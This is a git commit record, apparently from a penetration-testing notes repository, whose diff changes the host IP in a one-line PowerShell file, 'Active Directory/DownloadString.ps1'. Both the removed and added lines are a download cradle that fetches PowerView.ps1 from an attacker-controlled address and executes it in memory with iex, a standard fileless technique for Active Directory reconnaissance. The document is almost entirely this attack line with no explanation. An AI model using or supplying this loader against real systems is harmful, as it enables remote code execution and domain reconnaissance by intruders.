cc1fbaf2b4999d33426cca2349caeb614323bcb9
kali <patrick.williams022@gmail.com>
2020-03-21 15:37:36 +1300

    Fix ip

--- Active Directory/DownloadString.ps1
+++ Active Directory/DownloadString.ps1
@@ -1,1 +1,1 @@
-iex (New-Object System.Net.Webclient).DownloadString('http://192.168.60.145/PowerView.ps1')
+iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.177/PowerView.ps1')
